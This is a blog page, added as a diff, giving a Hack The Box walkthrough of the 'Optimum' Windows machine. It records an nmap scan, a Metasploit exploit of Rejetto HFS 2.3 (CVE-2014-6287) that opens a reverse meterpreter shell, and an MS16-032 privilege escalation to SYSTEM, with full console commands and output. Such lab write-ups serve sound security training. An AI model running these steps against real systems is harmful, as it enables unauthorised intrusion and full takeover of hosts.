@@ -1,0 +1,634 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          Hack The Box - Optimun - DiegoExploit
+        
+    </title>
+    <style>
+  #carbonads {
+    border: 1px solid black;
+    border-radius: 7px;
+    border-spacing: 7px;
+    display: block;
+    overflow: hidden;
+    padding: 1em;
+    line-height: 1.5;
+  }
+  #carbonads span {
+    position: relative;
+    display: block;
+    overflow: hidden;
+  }
+  .carbon-img {
+    float: left;
+    margin-right: 1em;
+  }
+  .carbon-img img {
+    display: block;
+  }
+  .carbon-text {
+    display: block;
+    float: left;
+    max-width: calc(100% - 130px - 1em);
+    text-align: left;
+  }
+  .carbon-poweredby {
+    position: absolute;
+    left: 142px;
+    bottom: 0;
+    display: block;
+    font-size: .8em;
+    line-height: 1;
+    letter-spacing: 1px;
+    }
+    </style>
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+<!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-P385GSF');</script>
+<!-- End Google Tag Manager -->
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-P385GSF"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+    <style>
+      #htbbadge{
+        float: left;
+      }
+    </style>
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/feed.xml" title="DiegoExploit" type="application/rss+xml">
+</head>
+
+<body>
+
+<div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>DiegoExploit</span>
+  </a>
+</div>
+    <div class="book-menu">
+  <ul>
+<li><a href="/">Home</a></li>
+</ul>
+<h1 id="Categories Windows"><a href="#Categories Windows" class="headerlink" title="Categories Windows"></a>Categories Windows</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
+<li><a href="/hack-the-box/legacy/">1. Hack The Box - Legacy</a></li>
+<li><a href="/hack-the-box/devel/">2. Hack The Box - Devel</a></li>
+<li><a href="/hack-the-box/optimum/">3. Hack The Box - Optimum</a></li>
+<li><a href="/hack-the-box/bastard/">4. Hack The Box - Bastard</a></li>
+<li><a href="/hack-the-box/artic/">5. Hack The Box - Artic</a></li>
+<li><a href="/hack-the-box/grandpa/">6. Hack The Box - Grandpa</a></li>
+<li><a href="/hack-the-box/granny/">7. Hack The Box - Granny</a></li>
+<li><a href="/hack-the-box/blue/">8. Hack The Box - Blue</a></li>
+<li><a href="/hack-the-box/silo/">9. Hack The Box - Silo</a></li>
+<li><a href="/hack-the-box/bounty/">10. Hack The Box - Bounty</a></li>
+<li><a href="/hack-the-box/jerry/">11. Hack The Box - Jerry</a></li>
+<li><a href="/hack-the-box/conceal/">12. Hack The Box - Conceal</a></li>
+<li><a href="/hack-the-box/chatterbox/">13. Hack The Box - Chatterbox</a></li>
+<li><a href="/hack-the-box/forest/">14. Hack The Box - Forest</a></li>
+<li><a href="/hack-the-box/bankrobber/">15. Hack The Box - BkRobber</a></li>
+<li><a href="/hack-the-box/secnotes/">16. Hack The Box - Secnotes</a></li>
+<li><a href="/hack-the-box/bastion/">17. Hack The Box - Bastion</a></li>
+
+</ul>
+<h1 id="Categories Linux"><a href="#Categories Linux" class="headerlink" title="Categories Linux"></a>Categories Linux</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
+<li><a href="/hack-the-box/lame/">1. Hack The Box - Lame</a></li>
+<li><a href="/hack-the-box/popcorn/">2. Hack The Box - Popcorn</a></li>
+<li><a href="/hack-the-box/beep/">3. Hack The Box - Beep</a></li>
+<li><a href="/hack-the-box/tenten/">4. Hack The Box - Tenten</a></li>
+<li><a href="/hack-the-box/cronos/">5. Hack The Box - Cronos</a></li>
+<li><a href="/hack-the-box/brainfuck/">6. Hack The Box - brainfuck</a></li>
+<li><a href="/hack-the-box/shocker/">6. Hack The Box - Shocker</a></li>
+<li><a href="/hack-the-box/bashed/">7. Hack The Box - Bashed</a></li>
+<li><a href="/hack-the-box/nibbles/">8. Hack The Box - Nibbles</a></li>
+<li><a href="/hack-the-box/nineveh/">9. Hack The Box - Nineveh</a></li>
+<li><a href="/hack-the-box/sense/">10. Hack The Box - Sense</a></li>
+<li><a href="/hack-the-box/solidstate/">11. Hack The Box - SolidState</a></li>
+<li><a href="/hack-the-box/kotarak/">12. Hack The Box - Kotarak</a></li>
+<li><a href="/hack-the-box/node/">13. Hack The Box - Node</a></li>
+<li><a href="/hack-the-box/valentine/">14. Hack The Box - Valentine</a></li>
+<li><a href="/hack-the-box/poison/">15. Hack The Box - Poison</a></li>
+<li><a href="/hack-the-box/sunday/">16. Hack The Box - Sunday</a></li>
+<li><a href="/hack-the-box/tartasauce/">17. Hack The Box - Tartasauce</a></li>
+<li><a href="/hack-the-box/friendzone/">18. Hack The Box - Friendzone</a></li>
+<li><a href="/hack-the-box/swagshop/">19. HTB- SwagShop</a></li>
+<li><a href="/hack-the-box/jarvis/">20. Hack The Box Jarvis</a></li>
+</ul>
+
+
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <div class="book-post">
+  <br>
+  <h1 id="Hack-The-Box-Optimum"><a href="#Hack-The-Box-Optimum" class="headerlink" title="Hack The Box - Optimum"></a>Hack The Box - Optimum</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Optimum is another simple beginner Windows target. Is a machine which mainly focuses on enumeration of services with known exploit. Its IP address is <code>10.10.10.8.</code> Let’s go to hack!!!<br><img src="/images/hackthebox/exploit/optimum/1.png" alt=""></p>
+<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2>
+<p>As always we will start with <code>nmap</code> to scan for open ports and services:
+<pre><figure class="highlight plain">
+ |-------(root@kali)-------|(~/HackTheBox/optimum)<br> |<br> |-->{SFire129}#nmap -A -v 10.10.10.8
+ Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-13 18:31 EDT
+ NSE: Loaded 151 scripts for scanning.
+ NSE: Script Pre-scanning.
+ Completed NSE at 18:32, 0.00s elapsed
+ Nmap scan report for 10.10.10.8
+ Host is up (0.17s latency).
+ Not shown: 999 filtered ports
+ PORT   STATE SERVICE VERSION
+ 80/tcp open  http    HttpFileServer httpd 2.3
+ |_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
+ | http-methods:
+ |_  Supported Methods: GET HEAD POST
+ |_http-server-header: HFS 2.3
+ |_http-title: HFS /
+ Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+ Aggressive OS guesses: Microsoft Windows Server 2012 (91%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows 7 Professional (87%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows 7 or Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 or Windows 8.1 (85%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%), Microsoft Windows Server 2016 (85%)
+ No exact OS matches for host (test conditions non-ideal).
+ Uptime guess: 1.208 days (since Tue May 12 13:32:47 2020)
+ Network Distance: 2 hops
+ TCP Sequence Prediction: Difficulty=256 (Good luck!)
+ IP ID Sequence Generation: Incremental
+ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+ 
+ TRACEROUTE (using port 80/tcp)
+ HOP RTT       ADDRESS
+ 1   167.67 ms 10.10.14.1
+ 2   176.23 ms 10.10.10.8
+ 
+ NSE: Script Post-scanning.
+ Initiating NSE at 18:32
+ Completed NSE at 18:32, 0.00s elapsed
+ Initiating NSE at 18:32
+ Completed NSE at 18:32, 0.00s elapsed
+ Initiating NSE at 18:32
+ Completed NSE at 18:32, 0.00s elapsed
+ Read data files from: /usr/bin/../share/nmap
+ OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+ Nmap done: 1 IP address (1 host up) scanned in 31.41 seconds
+            Raw packets sent: 2095 (95.864KB) | Rcvd: 37 (2.316KB)
+
+</figure></pre>
+
+<p> The  port 80 is open, which is HttpFileServer version 2.3, this service is vulnerable to <code>CVE-2014-6287</code>
+
+ <h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2>
+
+ <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/optimum)<br> |<br>  |-->{SFire129}#msfconsole
+ 
+ Call trans opt: received. 2-19-98 13:24:18 REC:Loc
+ 
+      Trace program: running
+ 
+            wake up, Neo...
+         the matrix has you
+       follow the white rabbit.
+ 
+           knock, knock, Neo.
+ 
+                         (`.         ,-,
+                         ` `.    ,;' /
+                          `.  ,'/ .'
+                           `. X /.'
+                 .-;--''--.._` ` (
+               .'            /   `
+              ,           ` '   Q '
+              ,         ,   `._    \
+           ,.|         '     `-.;_'
+           :  . `  ;    `  ` --,.._;
+            ' `    ,   )   .'
+               `._ ,  '   /_
+                  ; ,''-,;' ``-
+                   ``-..__``--`
+ 
+                              https://metasploit.com
+ 
+ 
+        =[ metasploit v5.0.86-dev                          ]
+ + -- --=[ 2004 exploits - 1096 auxiliary - 343 post       ]
+ + -- --=[ 566 payloads - 45 encoders - 10 nops            ]
+ + -- --=[ 7 evasion                                       ]
+ 
+ Metasploit tip: Writing a custom module? After editing your module, why not try the reload command
+ 
+ msf5 > search rejetto
+ 
+ Matching Modules
+ ================
+ 
+    #  Name                                   Disclosure Date  Rank       Check  Description
+    -  ----                                   ---------------  ----       -----  -----------
+    0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution
+ 
+ 
+ msf5 > use exploit/windows/http/rejetto_hfs_exec
+ msf5 exploit(windows/http/rejetto_hfs_exec) > set rhost 10.10.10.8
+ rhost => 10.10.10.8
+ msf5 exploit(windows/http/rejetto_hfs_exec) > set lhost 10.10.14.23
+ lhost => 10.10.14.23
+ msf5 exploit(windows/http/rejetto_hfs_exec) > run
+ [*] Started reverse TCP handler on 10.10.14.23:4444
+ [*] Using URL: http://0.0.0.0:8080/rHoH3hvDk
+ [*] Local IP: http://192.168.0.14:8080/rHoH3hvDk
+ [*] Server started.
+ [*] Sending a malicious request to /
+  meterpreter >
+  meterpreter > shell
+ Process 1356 created.
+ Channel 2 created.
+ Microsoft Windows [Version 6.3.9600]
+ (c) 2013 Microsoft Corporation. All rights reserved.
+
+ C:\Users\kostas\Desktop>whoami
+ whoami
+ optimum\kostas
+ C:\Users\kostas\Desktop>exit
+ meterpreter > sysinfo
+ Computer        : OPTIMUM
+ OS              : Windows 2012 R2 (6.3 Build 9600).
+ Architecture    : x64
+ System Language : el_GR
+ Domain          : HTB
+ Logged On Users : 1
+ Meterpreter     : x86/windows</figure></pre>
+<p>We need to migrate an active process to get privileges. Search the process explorer.exe and migrate.
+ 
+
+ 
+<h2 id="Get-Privileges"><a href="#Get-Privilege" class="headerlink" title="Get Privilege"></a>Get Privileges</h2>
+
+<pre><figure class="highlight plain">meterpreter > ps
+ 
+ Process List
+ ============
+ 
+  PID   PPID  Name                     Arch  Session  User            Path
+  ---   ----  ----                     ----  -------  ----            ----
+  0     0     [System Process]
+  4     0     System
+  228   4     smss.exe
+  308   484   spoolsv.exe
+  336   328   csrss.exe
+  388   328   wininit.exe
+  400   380   csrss.exe
+  444   380   winlogon.exe
+  484   388   services.exe
+  492   388   lsass.exe
+  552   484   svchost.exe
+  580   484   svchost.exe
+  652   1956  conhost.exe              x64   1        OPTIMUM\kostas  C:\Windows\System32\conhost.exe
+  672   444   dwm.exe
+  680   484   svchost.exe
+  708   484   svchost.exe
+  764   1112  cmd.exe                  x64   1        OPTIMUM\kostas  C:\Windows\System32\cmd.exe
+  768   484   svchost.exe
+  816   484   svchost.exe
+  844   484   svchost.exe
+  876   3052  cmd.exe                  x86   1        OPTIMUM\kostas  C:\Windows\SysWOW64\cmd.exe
+  944   484   VGAuthService.exe
+  972   484   svchost.exe
+  1012  2544  41020.exe                x64   1                        C:\Users\kostas\Desktop\41020.exe
+  1036  484   vmtoolsd.exe
+  1060  484   ManagementAgentHost.exe
+  1072  2732  cmd.exe                  x64   1        OPTIMUM\kostas  C:\Windows\System32\cmd.exe
+  1112  1544  kXfGRGxukD.exe           x64   1        OPTIMUM\kostas  C:\Users\kostas\AppData\Local\Temp\radAC329.tmp\kXfGRGxukD.exe
+  1116  2580  wscript.exe              x86   1        OPTIMUM\kostas  C:\Windows\SysWOW64\wscript.exe
+  1200  3040  conhost.exe              x64   1        OPTIMUM\kostas  C:\Windows\System32\conhost.exe
+  1304  2060  conhost.exe              x64   1        OPTIMUM\kostas  C:\Windows\System32\conhost.exe
+  1320  1416  cmd.exe                  x86   1        OPTIMUM\kostas  C:\Windows\SysWOW64\cmd.exe
+  1376  484   svchost.exe
+  1416  2580  nc.exe                   x86   1        OPTIMUM\kostas  C:\Users\Public\nc.exe
+  1460  484   dllhost.exe
+  1544  2580  wscript.exe              x86   1        OPTIMUM\kostas  C:\Windows\SysWOW64\wscript.exe
+  1596  552   WmiPrvSE.exe
+  1700  484   msdtc.exe
+  1956  2732  cmd.exe                  x64   1        OPTIMUM\kostas  C:\Windows\System32\cmd.exe
+  2016  1416  conhost.exe              x64   1        OPTIMUM\kostas  C:\Windows\System32\conhost.exe
+  2060  2724  cmd.exe                  x86   1        OPTIMUM\kostas  C:\Windows\SysWOW64\cmd.exe
+  2064  708   taskhostex.exe           x64   1        OPTIMUM\kostas  C:\Windows\System32\taskhostex.exe
+  2084  2704  powershell.exe           x64   1        OPTIMUM\kostas  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+  2124  764   conhost.exe              x64   1        OPTIMUM\kostas  C:\Windows\System32\conhost.exe
+  2168  2132  explorer.exe             x64   1        OPTIMUM\kostas  C:\Windows\explorer.exe
+  2176  1072  conhost.exe              x64   1        OPTIMUM\kostas  C:\Windows\System32\conhost.exe
+  2440  2580  wscript.exe              x86   1        OPTIMUM\kostas  C:\Windows\SysWOW64\wscript.exe
+  2524  1192  cmd.exe                  x64   1        OPTIMUM\kostas  C:\Windows\System32\cmd.exe
+  2544  1112  cmd.exe                  x64   1        OPTIMUM\kostas  C:\Windows\System32\cmd.exe
+  2552  2168  vmtoolsd.exe             x64   1        OPTIMUM\kostas  C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
+  2580  2168  hfs.exe                  x86   1        OPTIMUM\kostas  C:\Users\kostas\Desktop\hfs.exe
+  2596  876   conhost.exe              x64   1        OPTIMUM\kostas  C:\Windows\System32\conhost.exe
+  2704  2580  powershell.exe           x64   1        OPTIMUM\kostas  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+  2708  1012  cmd.exe
+  2724  2440  PMjkrVDaLSW.exe          x86   1        OPTIMUM\kostas  C:\Users\kostas\AppData\Local\Temp\radE4CB1.tmp\PMjkrVDaLSW.exe
+  2732  2888  Exhyztjb.exe             x64   1        OPTIMUM\kostas  C:\Users\kostas\AppData\Local\Temp\rad68FA5.tmp\Exhyztjb.exe
+  2740  2708  cmd.exe
+  2748  2524  conhost.exe              x64   1        OPTIMUM\kostas  C:\Windows\System32\conhost.exe
+  2760  2544  conhost.exe              x64   1        OPTIMUM\kostas  C:\Windows\System32\conhost.exe
+  2768  2820  MtVehhDOuvPa.exe         x64   1        OPTIMUM\kostas  C:\Users\kostas\AppData\Local\Temp\radDD1FF.tmp\MtVehhDOuvPa.exe
+  2820  2580  wscript.exe              x86   1        OPTIMUM\kostas  C:\Windows\SysWOW64\wscript.exe
+  2888  2580  wscript.exe              x86   1        OPTIMUM\kostas  C:\Windows\SysWOW64\wscript.exe
+  3012  2704  conhost.exe              x64   1        OPTIMUM\kostas  C:\Windows\System32\conhost.exe
+  3040  2168  cmd.exe                  x64   1        OPTIMUM\kostas  C:\Windows\System32\cmd.exe
+  3052  1116  fUqKgAESVPeYC.exe        x86   1        OPTIMUM\kostas  C:\Users\kostas\AppData\Local\Temp\radC4E26.tmp\fUqKgAESVPeYC.exe
+ 
+ meterpreter > migrate  2168
+ [*] Migrating from 3052 to 2168...
+ [*] Migration completed successfully.
+
+</figure></pre>
+
+<p> Reconfigure Exploit with <code>exploit/windows/local/ms16_032_secondary_logon_handle_privesc</code>
+ 
+ <pre><figure class="highlight plain">meterpreter > background
+ [*] Backgrounding session 1...
+ msf5 exploit(windows/http/rejetto_hfs_exec) > search exploit/windows/local | grep logon_handle
+ 58  exploit/windows/local/ms16_032_secondary_logon_handle_privesc      2016-03-21       normal     Yes    MS16-032 Secondary Logon Handle Privilege Escalation
+ msf5 exploit(windows/http/rejetto_hfs_exec) > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
+ msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set payload windows/meterpreter/reverse_tcp
+ msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set lhost 10.10.14.23
+ msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set LPORT 4445
+ msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > run
+
+ [*] Started reverse TCP handler on 10.10.14.23:4445
+ [+] Compressed size: 1016
+ [!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell
+ [*] Writing payload file, C:\Users\kostas\AppData\Local\Temp\ZUtuIXjwOz.ps1...
+ [*] Compressing script contents...
+ [+] Compressed size: 3600
+ [*] Executing exploit script...
+          __ __ ___ ___   ___     ___ ___ ___
+         |  V  |  _|_  | |  _|___|   |_  |_  |
+         |     |_  |_| |_| . |___| | |_  |  _|
+         |_|_|_|___|_____|___|   |___|___|___|
+ 
+                        [by b33f -> @FuzzySec]
+ 
+ [?] Operating system core count: 2
+ [>] Duplicating CreateProcessWithLogonW handle
+ [?] Done, using thread handle: 1348
+ 
+ [*] Sniffing out privileged impersonation token..
+ 
+ [?] Thread belongs to: svchost
+ [+] Thread suspended
+ [>] Wiping current impersonation token
+ [>] Building SYSTEM impersonation token
+ [?] Success, open SYSTEM token handle: 1344
+ [+] Resuming thread..
+ 
+ [*] Sniffing out SYSTEM shell..
+ 
+ [>] Duplicating SYSTEM token
+ [>] Starting token race
+ [>] Starting process race
+ [!] Holy handle leak Batman, we have a SYSTEM shell!!
+ 
+ 1JX58U8pdM0d7IXNDiI3965ypsvr2x0E
+ [+] Executed on target machine.
+ [*] Sending stage (180291 bytes) to 10.10.10.8
+ [*] Meterpreter session 2 opened (10.10.14.23:4445 -> 10.10.10.8:49363) at 2020-05-13 18:47:26 -0400
+ [+] Deleted C:\Users\kostas\AppData\Local\Temp\ZUtuIXjwOz.ps1
+ 
+ meterpreter > shell
+ Process 2072 created.
+ Channel 1 created.
+ Microsoft Windows [Version 6.3.9600]
+ (c) 2013 Microsoft Corporation. All rights reserved.
+
+ C:\Users\kostas\AppData\Local\Temp>whoami
+ whoami
+ nt authority\system
+ </figure></pre>
+  
+   <h2 id="Capture the Flag"><a href="#Capture-the-Flag" class="headerlink" title="Capture the Flag"></a>Capture the Flag</h2>
+    <pre><figure class="highlight plain">c:\Users\kostas\AppData\Local\Tempcd c:\
+ c:\cd Users
+ cd Users
+ c:\Usersdir
+ dir
+  Volume in drive C has no label.
+  Volume Serial Number is D0BC-0196
+ 
+  Directory of c:\Users
+ 
+ 18/03/2017  02:57     DIR          .
+ 18/03/2017  02:57     DIR          ..
+ 18/03/2017  02:52     DIR          Administrator
+ 18/03/2017  02:57     DIR          kostas
+ 20/05/2020  05:10     DIR          Public
+                0 File(s)              0 bytes
+                5 Dir(s)  31.888.084.992 bytes free
+ 
+ c:\Userscd kostas
+ c:\Users\kostasdir
+ dir
+  Volume in drive C has no label.
+  Volume Serial Number is D0BC-0196
+ 
+  Directory of c:\Users\kostas
+ 
+ 18/03/2017  02:57     DIR          .
+ 18/03/2017  02:57     DIR          ..
+ 18/03/2017  02:57     DIR          Contacts
+ 20/05/2020  05:35     DIR          Desktop
+ 18/03/2017  02:57     DIR          Documents
+ 18/03/2017  03:10     DIR          Downloads
+ 18/03/2017  02:57     DIR          Favorites
+ 18/03/2017  02:57     DIR          Links
+ 18/03/2017  02:57     DIR          Music
+ 18/03/2017  02:57     DIR          Pictures
+ 18/03/2017  02:57     DIR          Saved Games
+ 18/03/2017  02:57     DIR          Searches
+ 18/03/2017  02:57     DIR          Videos
+                0 File(s)              0 bytes
+               13 Dir(s)  31.888.084.992 bytes free
+ 
+ c:\Users\kostascd Desktop
+ c:\Users\kostas\Desktopdir
+ c:\Users\kostas\Desktopdir
+ dir
+  Volume in drive C has no label.
+  Volume Serial Number is D0BC-0196
+ 
+  Directory of c:\Users\kostas\Desktop
+ 
+ 20/05/2020  05:35     DIR          .
+ 20/05/2020  05:35     DIR          ..
+ 20/05/2020  10:37     DIR          %TEMP%
+ 19/05/2020  07:57            560.128 41020.exe
+ 19/05/2020  06:05              1.678 gnvuzWcXMIZ.txt
+ 18/03/2017  03:11            760.320 hfs.exe
+ 19/05/2020  06:15              1.879 laskMMAE.txt
+ 19/05/2020  07:04              6.674 output.txt
+ 18/03/2017  03:13                 32 user.txt.txt
+ 19/05/2020  06:13              1.910 ZxDNNwjflnFFt.txt
+                7 File(s)      1.332.621 bytes
+                3 Dir(s)  31.888.084.992 bytes free
+ 
+ c:\Users\kostas\Desktoptype user.txt.txt
+ 
+ ***here will be show you the flag user***
+ c:\Users\kostas\Desktopcd ..
+ c:\Users\kostas ..
+ c:\Usercd administrator
+ c:\Users\Administratorcd Desktop
+ c:\Users\Administrator\Desktopdir
+ dir
+  Volume in drive C has no label.
+  Volume Serial Number is D0BC-0196
+ 
+  Directory of c:\Users\Administrator\Desktop
+ 
+ 18/03/2017  03:14     DIR          .
+ 18/03/2017  03:14     DIR          ..
+ 18/03/2017  03:14                 32 root.txt
+                1 File(s)             32 bytes
+                2 Dir(s)  31.888.084.992 bytes free
+ 
+ c:\Users\Administrator\Desktoptype root.txt
+ ***here will be show you the flag root***
+ c:\Users\Administrator\Desktop
+     
+  </figure></pre>
+<p> And we owned root !</p>
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image -->
+    <div class="author-img">
+      
+        <figure class="avatar avatar-lg">
+          <img src="/avatar.png" alt="...">
+        </figure>
+      
+    </div>
+
+    <!-- Author title -->
+    <div class="author-title">
+      <div>DiegoExploit</div>
+      <div>2020-05-13</div>
+    </div>
+  </div>
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>
+
+      <a class="tag-link" href="/tags/linux/" rel="tag">#windows</a> <a class="tag-link" href="/tags/sqli/" rel="tag">#Exploit</a> <a class="tag-link" href="/tags/ssh/" rel="tag">#capture-the-Flag</a>
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+</body>
+</html>
+
+
+<script src="/js/book.js"></script>
